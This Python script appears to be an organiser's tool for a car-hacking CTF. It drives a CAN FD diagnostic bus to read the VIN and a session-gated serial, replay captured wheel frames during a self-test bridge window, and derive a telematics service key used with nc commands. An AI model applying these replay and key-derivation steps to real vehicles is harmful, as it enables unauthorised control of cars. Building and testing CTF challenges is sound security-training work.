#!/usr/bin/env python3
"""TinyTrek CTF operator tool -- run the whole challenge chain from a laptop.

Standard library only, so it runs on a stock macOS Python with nothing installed.

    ./ttos-ctf-tool.py probe                        what is my adapter, can it do FD
    ./ttos-ctf-tool.py walk --car 01                the full C1 -> C2 -> C3 chain
    ./ttos-ctf-tool.py vin                          single steps, for poking about
    ./ttos-ctf-tool.py pivot --dir cw
    ./ttos-ctf-tool.py snapshot
    ./ttos-ctf-tool.py monitor                      dump the diagnostic bus

Transport is selected with --transport:

    slcan     serial adapter speaking LAWICEL/slcan  (macOS, SavvyCAN hardware)
              ./ttos-ctf-tool.py --transport slcan --port /dev/tty.usbmodem1101 walk
    socketcan Linux only -- the bench rig. Same logic, different wire.
              ./ttos-ctf-tool.py --transport socketcan --iface ttdiag walk

------------------------------------------------------------------------------
YOUR ADAPTER MUST DO CAN FD.

The diagnostic bus runs 500 kbit arbitration / 1 Mbit data, and every response
worth having is longer than a classic frame can carry:

    VIN (0xF190)        20 bytes
    pivot response      12 bytes   <- the C1 flag lives here
    snapshot (0xF1A0)   23 bytes   <- the C2 corpus

A classic-only adapter can TRANSMIT every request in this tool and will never
receive a single answer. That failure looks like a dead car, not like a
capability problem, which is why `probe` checks it first and says so plainly.
------------------------------------------------------------------------------
"""

import argparse
import hashlib
import os
import socket
import struct
import sys
import time

# ---------------------------------------------------------------- protocol ---

ID_PHYS, ID_FUNC, ID_RESP = 0x7E0, 0x7DF, 0x7E8
SID_SESSION, SID_TP, SID_RDBI, SID_ROUTINE, SID_NEG = 0x10, 0x3E, 0x22, 0x31, 0x7F
RESP = 0x40
SESSION_DEFAULT, SESSION_EXTENDED = 0x01, 0x03
RC_START = 0x01
RID_PIVOT, RID_BRIDGE, RID_SELFTEST = 0x0201, 0x0202, 0x0203
DID_VIN, DID_SERIAL, DID_SNAPSHOT, DID_TELEMATICS = 0xF190, 0xF18C, 0xF1A0, 0xF1A1
ID_L, ID_R = 0x111, 0x113

NRC = {0x11: "serviceNotSupported", 0x12: "subFunctionNotSupported",
       0x13: "incorrectLength", 0x22: "conditionsNotCorrect",
       0x31: "requestOutOfRange", 0x33: "securityAccessDenied",
       0x78: "responsePending", 0x7E: "subFunctionNotSupportedInActiveSession",
       0x7F: "serviceNotSupportedInActiveSession"}

FD_LENGTHS = (0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 16, 20, 24, 32, 48, 64)

B, R, G, Y, X = "\033[1m", "\033[31m", "\033[32m", "\033[33m", "\033[0m"


def fd_len(n):
    for q in FD_LENGTHS:
        if n <= q:
            return q
    raise ValueError("payload exceeds 64 bytes")


class Frame:
    __slots__ = ("id", "data", "fd")

    def __init__(self, can_id, data=b"", fd=False):
        self.id, self.data, self.fd = can_id, bytes(data), fd

    def __repr__(self):
        return f"{self.id:03X}#{self.data.hex().upper()}{' [FD]' if self.fd else ''}"


def pack_sf(payload):
    """ISO 15765-2 single frame. >7 bytes uses the CAN FD escape form."""
    if len(payload) <= 7:
        return bytes([len(payload)]) + payload, False
    body = bytes([0x00, len(payload)]) + payload
    return body.ljust(fd_len(len(body)), b"\x00"), True


def unpack_sf(d):
    if len(d) < 2 or d[0] >> 4 != 0:
        return None
    n = d[0] & 0x0F
    if n == 0:
        n = d[1]
        return d[2:2 + n] if n and len(d) >= 2 + n else None
    return d[1:1 + n] if len(d) >= 1 + n else None


class NegResp(Exception):
    def __init__(self, sid, nrc):
        self.sid, self.nrc = sid, nrc
        super().__init__(f"NRC {nrc:#04x} ({NRC.get(nrc, '?')}) to service {sid:#04x}")


# --------------------------------------------------------------- transports ---

class Transport:
    fd_capable = False
    name = "?"

    def send(self, frame): raise NotImplementedError
    def recv(self, timeout): raise NotImplementedError
    def close(self): pass


class SocketCAN(Transport):
    """Linux only. The bench rig uses this, so the challenge logic below is
    exercised against a real car before it ever meets your adapter."""
    name = "socketcan"

    def __init__(self, iface):
        self.sock = socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW)
        try:
            self.sock.setsockopt(socket.SOL_CAN_RAW, 5, 1)   # CAN_RAW_FD_FRAMES
            self.fd_capable = True
        except OSError:
            pass
        self.sock.bind((iface,))
        self.iface = iface

    def send(self, f):
        if f.fd:
            n = fd_len(len(f.data))
            buf = struct.pack("=IBBBB64s", f.id, n, 0x01, 0, 0,
                              f.data.ljust(64, b"\x00"))
        else:
            buf = struct.pack("=IB3x8s", f.id, len(f.data), f.data.ljust(8, b"\x00"))
        self.sock.send(buf)

    def recv(self, timeout):
        self.sock.settimeout(timeout)
        try:
            buf, _anc, flags, _addr = self.sock.recvmsg(72)
        except (socket.timeout, OSError):
            return None
        # Drop locally generated frames: MSG_DONTROUTE marks anything that came
        # from a socket on this host rather than off the wire. Without it our own
        # request looks like the car's reply.
        if flags & socket.MSG_DONTROUTE:
            return self.recv(timeout)
        if len(buf) >= 72:
            cid, n, _fl, _r0, _r1, data = struct.unpack("=IBBBB64s", buf[:72])
            return Frame(cid & 0x1FFFFFFF, data[:n], fd=True)
        cid, n, data = struct.unpack("=IB3x8s", buf[:16])
        return Frame(cid & 0x1FFFFFFF, data[:n], fd=False)

    def close(self):
        self.sock.close()


class SLCAN(Transport):
    """LAWICEL/slcan over a serial port -- what most SavvyCAN-compatible USB
    adapters speak on macOS.

    Uses termios directly so nothing has to be pip-installed on a Mac that is
    about to be carried to an event.

    FD support in slcan is a VENDOR EXTENSION, not part of the original spec.
    CANable 2.0 and similar use 'Y' for the data bitrate and lowercase 'd'/'b'
    for FD frames. If your adapter answers `probe` with no FD indication, stop
    and get one that does -- see the header comment for why.
    """
    name = "slcan"

    def __init__(self, port, bitrate=500000, dbitrate=1000000, baud=1000000):
        import termios
        self.fd = os.open(port, os.O_RDWR | os.O_NOCTTY | os.O_NONBLOCK)
        attrs = termios.tcgetattr(self.fd)
        attrs[0] = attrs[1] = attrs[3] = 0          # iflag, oflag, lflag
        attrs[2] = termios.CS8 | termios.CREAD | termios.CLOCAL
        attrs[4] = attrs[5] = getattr(termios, f"B{baud}", termios.B115200)
        attrs[6][termios.VMIN] = 0
        attrs[6][termios.VTIME] = 0
        termios.tcsetattr(self.fd, termios.TCSANOW, attrs)
        self.buf = b""

        self._cmd(b"C")                              # close, in case it was open
        self._cmd(b"S6")                             # 500 kbit arbitration
        self.fd_capable = self._cmd(b"Y5") is not False   # 1 Mbit data (FD ext)
        self._cmd(b"O")                              # open

    def _cmd(self, s, wait=0.15):
        os.write(self.fd, s + b"\r")
        time.sleep(wait)
        try:
            r = os.read(self.fd, 256)
        except BlockingIOError:
            return None
        return False if b"\x07" in r else r          # BEL = adapter rejected it

    def send(self, f):
        h = f"{f.id:03X}"
        if f.fd:
            n = fd_len(len(f.data))
            payload = f.data.ljust(n, b"\x00")
            # 'b' = FD with bit-rate switch, standard identifier. DLC is the
            # QUANTISED code, not the byte count -- FD_LENGTHS index.
            line = f"b{h}{FD_LENGTHS.index(n):X}{payload.hex().upper()}"
        else:
            line = f"t{h}{len(f.data):X}{f.data.hex().upper()}"
        os.write(self.fd, line.encode() + b"\r")

    def recv(self, timeout):
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                chunk = os.read(self.fd, 512)
                if chunk:
                    self.buf += chunk
            except BlockingIOError:
                time.sleep(0.002)
            while b"\r" in self.buf:
                line, self.buf = self.buf.split(b"\r", 1)
                f = self._parse(line.decode(errors="replace").strip())
                if f:
                    return f
        return None

    @staticmethod
    def _parse(line):
        if not line or line[0] not in "tTbBdD":
            return None
        isfd = line[0] in "bBdD"
        ext = line[0] in "TBD"
        idlen = 8 if ext else 3
        try:
            can_id = int(line[1:1 + idlen], 16)
            code = int(line[1 + idlen], 16)
            n = FD_LENGTHS[code] if isfd else code
            data = bytes.fromhex(line[2 + idlen:2 + idlen + n * 2])
        except (ValueError, IndexError):
            return None
        return Frame(can_id, data, fd=isfd)

    def close(self):
        try:
            self._cmd(b"C")
            os.close(self.fd)
        except OSError:
            pass


def open_transport(args):
    if args.transport == "socketcan":
        return SocketCAN(args.iface)
    if not args.port:
        raise SystemExit("--port is required for the slcan transport "
                         "(e.g. /dev/tty.usbmodem1101)")
    return SLCAN(args.port)


# ------------------------------------------------------------------ tester ----

class Tester:
    def __init__(self, tp, timeout=1.5):
        self.tp, self.timeout = tp, timeout

    def request(self, payload, functional=False, timeout=None, raise_neg=True):
        body, isfd = pack_sf(bytes(payload))
        self.tp.send(Frame(ID_FUNC if functional else ID_PHYS, body, fd=isfd))
        deadline = time.monotonic() + (timeout or self.timeout)
        while time.monotonic() < deadline:
            f = self.tp.recv(max(0.01, deadline - time.monotonic()))
            if not f or f.id != ID_RESP:
                continue
            resp = unpack_sf(f.data)
            if not resp:
                continue
            if len(resp) >= 3 and resp[0] == SID_NEG and resp[2] == 0x78:
                deadline = time.monotonic() + (timeout or self.timeout)
                continue
            if raise_neg and len(resp) >= 3 and resp[0] == SID_NEG:
                raise NegResp(resp[1], resp[2])
            return resp
        return None

    def session(self, s):
        return self.request([SID_SESSION, s])

    def read_did(self, did, **kw):
        return self.request([SID_RDBI, did >> 8, did & 0xFF], **kw)

    def routine(self, rid, option=None, **kw):
        req = [SID_ROUTINE, RC_START, rid >> 8, rid & 0xFF]
        if option is not None:
            req.append(option)
        return self.request(req, **kw)


def parse_snapshot(resp):
    out, body = {}, resp[3:]
    while len(body) >= 10:
        out[body[0] << 8 | body[1]] = bytes(body[2:10])
        body = body[10:]
    return out


def crc8_j1850(data):
    crc = 0xFF
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = ((crc << 1) ^ 0x1D) & 0xFF if crc & 0x80 else (crc << 1) & 0xFF
    return crc ^ 0xFF


# ------------------------------------------------------------------ steps -----

def step(n, title):
    print(f"\n{B}[{n}] {title}{X}")


def ok(msg):
    print(f"    {G}✓{X} {msg}")


def bad(msg):
    print(f"    {R}✗{X} {msg}")


def note(msg):
    print(f"      {msg}")


def cmd_probe(args):
    tp = open_transport(args)
    print(f"\n{B}adapter{X}")
    print(f"    transport   : {tp.name}")
    print(f"    CAN FD      : {G+'yes'+X if tp.fd_capable else R+'NO'+X}")
    if not tp.fd_capable:
        bad("This adapter cannot receive CAN FD frames.")
        note("Every response in this tool is longer than 8 bytes: the VIN is 20,")
        note("the pivot response 12, the snapshot 23. You will be able to send")
        note("requests and will never see a reply. Get an FD-capable adapter.")
    print(f"\n{B}listening for 3 s{X}")
    seen, t0 = {}, time.monotonic()
    while time.monotonic() - t0 < 3:
        f = tp.recv(0.2)
        if f:
            seen[f.id] = seen.get(f.id, 0) + 1
    if seen:
        for i, c in sorted(seen.items()):
            print(f"    {i:03X}  x{c}")
        note("Traffic on a quiet diagnostic bus is unexpected -- the car only")
        note("transmits in response to a request. Are you on the DRIVE bus?")
    else:
        ok("silent, as a diagnostic bus should be with no request outstanding")
    tp.close()


def cmd_walk(args):
    tp = open_transport(args)
    t = Tester(tp)
    fail = []

    if not tp.fd_capable:
        print(f"\n{R}{B}This adapter cannot receive CAN FD. Nothing below will "
              f"return an answer.{X}\n")

    # -- C1 ------------------------------------------------------------------
    step("C1.1", "Read the VIN (0xF190, default session)")
    vin = ""
    try:
        t.session(SESSION_DEFAULT)
        vin = t.read_did(DID_VIN)[3:].decode()
        ok(f"VIN = {vin}")
    except (NegResp, TypeError, AttributeError) as e:
        bad(f"{e}"); fail.append("C1.1")

    step("C1.2", "Run the pivot routine -- the C1 flag is in the response")
    code_c1 = ""
    try:
        r = t.routine(RID_PIVOT, 0x01)
        code_c1 = r[4:].decode()
        ok(f"car pivots, and returns  {B}{code_c1}{X}")
        note("Paste that into the panel to unlock tier 1.")
    except (NegResp, TypeError) as e:
        bad(f"{e}"); fail.append("C1.2")

    # -- C2 ------------------------------------------------------------------
    step("C2.1", "The serial (0xF18C) is refused in the default session")
    try:
        t.session(SESSION_DEFAULT)
        t.read_did(DID_SERIAL)
        bad("it was NOT refused -- the session gate is not working")
        fail.append("C2.1")
    except NegResp as e:
        ok(f"refused: {e}")
        note("The NRC names its own solution: change session.")

    step("C2.2", "Open an extended session and read it")
    serial = ""
    try:
        t.session(SESSION_EXTENDED)
        serial = t.read_did(DID_SERIAL)[3:].decode()
        ok(f"serial = {serial}")
    except (NegResp, TypeError) as e:
        bad(f"{e}"); fail.append("C2.2")

    step("C2.3", "The decoy 'enable bridging' routine (0x0202)")
    try:
        t.routine(RID_BRIDGE)
        bad("the decoy OPENED -- it must always refuse")
        fail.append("C2.3")
    except NegResp as e:
        ok(f"refused with {e.nrc:#04x} securityAccessDenied, in every session")
        note("That door never opens. The self-test is the way in.")

    step("C2.4", "Build a corpus: pivot, then read the snapshot DID (0xF1A0)")
    cw = ccw = {}
    try:
        t.session(SESSION_EXTENDED)
        t.routine(RID_PIVOT, 0x01)
        cw = parse_snapshot(t.read_did(DID_SNAPSHOT))
        t.routine(RID_PIVOT, 0x02)
        ccw = parse_snapshot(t.read_did(DID_SNAPSHOT))
        for cid, d in sorted(cw.items()):
            ok(f"clockwise  {cid:03X} -> {d.hex().upper()}")
        for cid, d in sorted(ccw.items()):
            ok(f"counter-cw {cid:03X} -> {d.hex().upper()}")
        note("Protection bytes intact. These are replayable verbatim.")
    except (NegResp, TypeError, KeyError) as e:
        bad(f"{e}"); fail.append("C2.4")

    step("C2.5", "Compose a translation and replay it inside the 5 s window")
    if cw and ccw:
        want = cw[ID_L][4]
        lf = cw[ID_L] if cw[ID_L][4] == want else ccw[ID_L]
        rf = cw[ID_R] if cw[ID_R][4] == want else ccw[ID_R]
        ok(f"same-dir pair: {ID_L:03X}#{lf.hex().upper()}  {ID_R:03X}#{rf.hex().upper()}")
        note("Both wheels driven the same way -- a translation, which no")
        note("legitimate interface commands while the panel is locked.")
        try:
            t.session(SESSION_EXTENDED)
            r = t.routine(RID_SELFTEST)
            window = (r[4] << 8 | r[5]) / 1000 if r and len(r) >= 6 else 5.0
            ok(f"self-test opened the inbound bridge for {window:.0f} s")
            note("Replaying now. Watch for 0x7D1 on this bus.")
            deadline = time.monotonic() + window - 0.5
            while time.monotonic() < deadline:
                tp.send(Frame(ID_L, lf))
                tp.send(Frame(ID_R, rf))
                time.sleep(0.12)
            got = _await_flags(tp, 2.5)
            if 0x7D1 in got:
                ok(f"C2 flag: {B}{got[0x7D1]}{X}")
            else:
                bad("no 0x7D1 seen")
                note("If the car lurched but no flag arrived, the BMS detector is")
                note("disarmed -- check the heartbeat arm mask, or the C2 code has")
                note("already been redeemed on this car since its last reset.")
                fail.append("C2.5")
        except (NegResp, TypeError) as e:
            bad(f"{e}"); fail.append("C2.5")
    else:
        bad("no corpus -- skipping"); fail.append("C2.5")

    # -- C3 ------------------------------------------------------------------
    step("C3.1", "Find the telematics endpoint (0xF1A1)")
    endpoint = ""
    try:
        endpoint = t.read_did(DID_TELEMATICS)[3:].decode()
        ok(f"endpoint = {endpoint}")
    except (NegResp, TypeError) as e:
        bad(f"{e}  (the C2 panel tier also names it outright)")

    step("C3.2", "Derive the service key")
    if vin and serial and args.salt:
        key = hashlib.sha256(f"{vin}:{serial}:{args.salt}".encode()).hexdigest()[:16]
        ok(f"key = {B}{key}{X}")
        note("SHA-256(vin : serial : fleet_salt), first 16 hex chars.")
        note("The same transform ships in the panel JS as deriveServiceKey().")
        print(f"\n    Connect over the car's WiFi and drive it:")
        print(f"      nc {endpoint.replace(':', ' ') if endpoint else '<host> <port>'}")
        print(f"      AUTH {key}")
        print(f"      SEND 111#<8 protected bytes>")
        note("")
        note("Read every response -- the relay acknowledges each command, and a")
        note("client that does not drain replies gets its connection reset with")
        note("commands still unprocessed.")
    else:
        missing = [n for n, v in (("VIN", vin), ("serial", serial),
                                  ("--salt", args.salt)) if not v]
        bad(f"cannot derive: missing {', '.join(missing)}")
        if not args.salt:
            note("Pass --salt, or read FLEET_SALT from the panel's page source.")

    print()
    if fail:
        print(f"{R}{B}{len(fail)} step(s) failed: {', '.join(fail)}{X}\n")
        return 1
    print(f"{G}{B}full chain OK{X}\n")
    return 0


def _await_flags(tp, seconds):
    out, deadline = {}, time.monotonic() + seconds
    while time.monotonic() < deadline:
        f = tp.recv(0.2)
        if f and f.id in (0x7D1, 0x7D2):
            out[f.id] = f.data.rstrip(b"\x00").decode(errors="replace")
    return out


def cmd_vin(args):
    t = Tester(open_transport(args))
    t.session(SESSION_DEFAULT)
    print(t.read_did(DID_VIN)[3:].decode())


def cmd_pivot(args):
    t = Tester(open_transport(args))
    r = t.routine(RID_PIVOT, 0x01 if args.dir == "cw" else 0x02)
    print(r[4:].decode())


def cmd_snapshot(args):
    t = Tester(open_transport(args))
    t.session(SESSION_EXTENDED)
    for cid, d in sorted(parse_snapshot(t.read_did(DID_SNAPSHOT)).items()):
        print(f"{cid:03X}#{d.hex().upper()}")


def cmd_monitor(args):
    tp = open_transport(args)
    print("listening (ctrl-c to stop)")
    try:
        while True:
            f = tp.recv(1.0)
            if f:
                print(f"{time.strftime('%H:%M:%S')}  {f!r}")
    except KeyboardInterrupt:
        tp.close()


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--transport", choices=("slcan", "socketcan"), default="slcan")
    ap.add_argument("--port", help="serial device for slcan (macOS: /dev/tty.usbmodem*)")
    ap.add_argument("--iface", default="ttdiag", help="interface for socketcan")
    ap.add_argument("--salt", default=os.environ.get("TTOS_FLEET_SALT", ""),
                    help="fleet salt; also readable from the panel page source")
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("probe")
    w = sub.add_parser("walk"); w.add_argument("--car", default="01")
    sub.add_parser("vin")
    p = sub.add_parser("pivot"); p.add_argument("--dir", choices=("cw", "ccw"), default="cw")
    sub.add_parser("snapshot")
    sub.add_parser("monitor")
    args = ap.parse_args()
    return {"probe": cmd_probe, "walk": cmd_walk, "vin": cmd_vin,
            "pivot": cmd_pivot, "snapshot": cmd_snapshot,
            "monitor": cmd_monitor}[args.cmd](args) or 0


if __name__ == "__main__":
    sys.exit(main())
